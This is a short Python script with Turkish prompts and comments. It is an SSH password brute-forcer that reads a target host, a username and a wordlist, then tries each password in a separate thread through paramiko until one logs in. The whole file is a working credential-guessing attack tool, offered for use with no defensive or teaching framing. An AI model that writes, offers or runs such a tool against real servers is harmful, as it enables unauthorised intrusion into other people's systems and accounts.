#!/usr/bin/env python3
#*-* coding:utf-8 -*-
import paramiko, sys, os, termcolor
import threading, time

#Author: OctopusTR

octopus = 0

def ssh_connect(password):
    global octopus
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        ssh.connect(host, port=22, username=username, password=password)
        octopus = 1
        print(termcolor.colored(('[+] Parola Bulundu: ' + password), 'green'))    
    except:
        print(termcolor.colored(('[-] Başarısız: ' + password), 'red'))
    else:
        os._exit(1)
    ssh.close()

host = input('[+] Hedef Adres: ')
username = input('[+] SSH Kullanıcı Adı: ')
input_file = input('[*] Parola Dosyası: ')
print('\n')

if os.path.exists(input_file) == False:
    print('[!!] Bu Dosya/Yol Yok')
    sys.exit(1)


with open(input_file, 'r') as file:
    for line in file.readlines():
        if octopus == 1:
            t.join()
            exit()
        password = line.strip()
        t = threading.Thread(target=ssh_connect, args=(password,))
        t.start()
        time.sleep(0.5)